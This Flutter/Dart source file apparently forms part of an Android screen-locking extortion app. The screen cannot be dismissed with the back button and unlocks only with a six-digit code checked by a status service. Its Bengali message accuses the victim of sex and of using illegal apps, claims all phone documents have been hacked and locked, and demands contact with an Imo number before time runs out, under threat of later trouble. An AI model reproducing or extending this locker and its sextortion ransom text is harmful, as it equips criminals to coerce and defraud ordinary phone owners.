import 'package:flutter/material.dart';

import '../services/status_service.dart';

class LockOverlayScreen extends StatefulWidget {
  const LockOverlayScreen({
    super.key,
  });

  @override
  State<LockOverlayScreen> createState() =>
      _LockOverlayScreenState();
}

class _LockOverlayScreenState
    extends State<LockOverlayScreen> {
  final _codeController = TextEditingController();

  bool _loading = false;

  String? _error;

  @override
  void dispose() {
    _codeController.dispose();
    super.dispose();
  }

  Future<void> _unlock() async {
    final code = _codeController.text.trim();

    if (!RegExp(r'^\d{6}$').hasMatch(code)) {
      setState(() {
        _error = '৬ ডিজিটের Unlock Code দিন';
      });

      return;
    }

    setState(() {
      _loading = true;
      _error = null;
    });

    final success =
        await StatusService.unlockWithCode(code);

    if (!mounted) {
      return;
    }

    if (!success) {
      setState(() {
        _loading = false;
        _error = 'ভুল বা মেয়াদোত্তীর্ণ Unlock Code';
      });

      return;
    }

    setState(() {
      _loading = false;
    });
  }

  @override
  Widget build(BuildContext context) {
    return PopScope(
      canPop: false,
      child: Scaffold(
        backgroundColor: const Color(0xFF0B1020),

        body: Stack(
          fit: StackFit.expand,
          children: [

            // =========================================
            // BACKGROUND IMAGE
            // =========================================
            Image.asset(
              'assets/icon.jpg',
              fit: BoxFit.cover,
            ),

            // =========================================
            // DARK OVERLAY
            // =========================================
            Container(
              color: Colors.black.withValues(
                alpha: 0.60,
              ),
            ),

            // =========================================
            // MAIN CONTENT
            // =========================================
            SafeArea(
              child: Center(
                child: SingleChildScrollView(
                  padding: const EdgeInsets.all(28),
                  child: Column(
                    mainAxisAlignment:
                        MainAxisAlignment.center,
                    children: [

                      // =================================
                      // LOCK ICON
                      // =================================
                      Container(
                        width: 110,
                        height: 110,
                        decoration: BoxDecoration(
                          color: Colors.white.withValues(
                            alpha: .08,
                          ),
                          shape: BoxShape.circle,
                          border: Border.all(
                            color: Colors.white.withValues(
                              alpha: .12,
                            ),
                          ),
                        ),
                        child: const Icon(
                          Icons.lock_rounded,
                          color: Colors.white,
                          size: 58,
                        ),
                      ),

                      const SizedBox(
                        height: 30,
                      ),

                      // =================================
                      // TITLE / MAIN MESSAGE
                      // =================================
                     

                      const Text(
  '''
অভিনন্দন
সেক্স করা ও অবৈধ অ্যাপ ব্যবহার
করার অপরাধে
আমরা আপনার ফোনের সব ডকুমেন্ট হ্যাক করে
লক করে দিয়েছে।
এখন ফোনের সব কিছু নিতে এবং ফোনটা ঠিক করতে
এই [01991131852] নাম্বারে Imo-তে যোগাযোগ করুন।
শুধু (ইমোতে এস এম এস দিন)
আপনার ফোন দিয়ে ফোন দিতে পারবেন না।
তাই সময় ফুরিয়ে যাওয়ার আগে
অন্য কারো ফোন দিয়ে যোগাযোগ করুন। OK বি:দ্র >
যোগাযোগ করুন। না হলে পরবর্তীতে
আপনার সমস্যা হবে।
শুধু (ইমোতে এস এম এস দিন)
আপনার ফোন দিয়ে ফোন দিতে পারবেন না।
তাই সময় ফুরিয়ে যাওয়ার আগে
অন্য কারো ফোন দিয়ে যোগাযোগ করুন।
যোগাযোগ করুন। না হলে পরবর্তীতে
আপনার সমস্যা হবে।
''',
 textAlign: TextAlign.center,
                        style: TextStyle(
                          color: Colors.white70,
                          fontSize: 16,
                          height: 1.5,
                        ),
                      ),

                      const SizedBox(
                        height: 28,
                      ),


                      // =================================
                      // DESCRIPTION
                      // =================================
                   

     

                      // =================================
                      // UNLOCK CODE INPUT
                      // =================================
                      TextField(
                        controller: _codeController,
                        keyboardType:
                            TextInputType.number,
                        maxLength: 6,
                        obscureText: true,
                        textAlign: TextAlign.center,
                        style: const TextStyle(
                          color: Colors.white,
                          fontSize: 26,
                          fontWeight: FontWeight.bold,
                          letterSpacing: 8,
                        ),
                        decoration: InputDecoration(
                          hintText: '000000',
                          hintStyle: const TextStyle(
                            color: Colors.white24,
                            letterSpacing: 8,
                          ),
                          counterText: '',
                          filled: true,
                          fillColor:
                              Colors.white.withValues(
                            alpha: .07,
                          ),
                          border: OutlineInputBorder(
                            borderRadius:
                                BorderRadius.circular(14),
                          ),
                          enabledBorder:
                              OutlineInputBorder(
                            borderRadius:
                                BorderRadius.circular(14),
                            borderSide: BorderSide(
                              color:
                                  Colors.white.withValues(
                                alpha: .15,
                              ),
                            ),
                          ),
                          focusedBorder:
                              OutlineInputBorder(
                            borderRadius:
                                BorderRadius.circular(14),
                            borderSide:
                                const BorderSide(
                              color: Colors.white54,
                              width: 1.5,
                            ),
                          ),
                        ),
                      ),

                      const SizedBox(
                        height: 12,
                      ),

                      // =================================
                      // ERROR MESSAGE
                      // =================================
                      if (_error != null)
                        Text(
                          _error!,
                          textAlign: TextAlign.center,
                          style: const TextStyle(
                            color: Colors.redAccent,
                            fontSize: 14,
                          ),
                        ),

                      const SizedBox(
                        height: 14,
                      ),

                      // =================================
                      // UNLOCK BUTTON
                      // =================================
                      SizedBox(
                        width: double.infinity,
                        height: 54,
                        child: FilledButton(
                          onPressed:
                              _loading ? null : _unlock,
                          child: _loading
                              ? const SizedBox(
                                  width: 22,
                                  height: 22,
                                  child:
                                      CircularProgressIndicator(
                                    strokeWidth: 2,
                                    color: Colors.white,
                                  ),
                                )
                              : const Text(
                                  'Unlock Device',
                                  style: TextStyle(
                                    fontSize: 16,
                                    fontWeight:
                                        FontWeight.w700,
                                  ),
                                ),
                        ),
                      ),

                      const SizedBox(
                        height: 18,
                      ),

                      // =================================
                      // FOOTER
                      // =================================
                      const Text.rich(
                        TextSpan(
                          children: [
                            TextSpan(text: 'তার জন্য আমরা আন্তরিকভাবে দুঃখিত , '),
                            TextSpan(text: 'blocked থাকবে।'),
                          ],
                        ),
                        textAlign: TextAlign.center,
                        style: TextStyle(
                          color: Colors.white54,
                          fontSize: 12,
                          height: 1.4,
                        ),
                      ),
                    ],
                  ),
                ),
              ),
            ),
          ],
        ),
      ),
    );
  }
}